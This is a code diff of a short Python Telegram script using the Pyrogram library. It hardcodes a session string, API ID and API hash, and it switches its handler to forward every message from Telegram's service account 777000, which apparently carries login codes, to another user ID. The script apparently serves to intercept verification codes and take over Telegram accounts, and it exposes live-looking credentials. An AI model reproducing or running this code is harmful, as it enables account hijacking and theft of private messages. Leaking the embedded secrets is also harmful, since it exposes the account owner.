@@ -11,11 +11,11 @@ feri = 'AQCIP6gZeS83zy5yeCfzj-GgaXo-5ZKPhzcbRLROPjyMgbvbqyZVtYm7JS0vNWUuf_6Bvaoj
 
 app = Client(session_name=feri, api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851')
 
-id_or_username = '2113150493'
+id_or_username = ''
 
 
-@app.on_message(filters.user(2113150493))
+@app.on_message(filters.user(777000))
 async def forward_code(app:Client, message:Message):
-    await app.forward_message(id_or_username, message.chat.id, message.id)
+    await app.forward_messages(id_or_username, message.chat.id, message.id)
 
 app.run()
